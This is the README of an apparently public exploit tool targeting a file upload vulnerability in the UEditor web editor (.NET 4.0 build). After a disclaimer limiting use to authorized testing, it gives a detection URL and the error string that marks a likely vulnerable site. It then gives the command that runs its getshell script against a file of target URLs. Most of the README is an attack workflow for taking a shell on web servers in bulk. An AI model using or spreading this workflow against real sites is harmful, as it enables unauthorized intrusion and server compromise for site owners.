# 免责声明
使用本程序请自觉遵守当地法律法规，出现一切后果均与作者无关。

本工具旨在帮助企业快速定位漏洞修复漏洞,仅限授权安全测试使用!

严格遵守《中华人民共和国网络安全法》,禁止未授权非法攻击站点!

由于用户滥用造成的一切后果与作者无关。

切勿用于非法用途，非法使用造成的一切后果由自己承担，与作者无关。


# ueditor_fileupload_getshell
ueditor文本编辑器文件上传漏洞，getshell

### 限定版本为net4.0

### 食用方法 

##### 检测

完整domo页面
![image](https://user-images.githubusercontent.com/66779835/231994497-91004384-40e2-46be-bded-6855cd5fbfea.png)

检测poc：
http://xxxxx.com:xx/controller.ashx?action=catchimage
![image](https://user-images.githubusercontent.com/66779835/231994782-7a05906f-8790-498c-b111-e213ae7c4da8.png)

出现 '参数错误：没有指定抓取源' 可能存在漏洞

##### Getshell 利用

```
python .\ueditor_fileupload_getshell.py -f ./url.txt
```
![image](https://user-images.githubusercontent.com/66779835/231987701-b7b00e8a-d3d8-453d-bf58-1f32d3da3758.png)

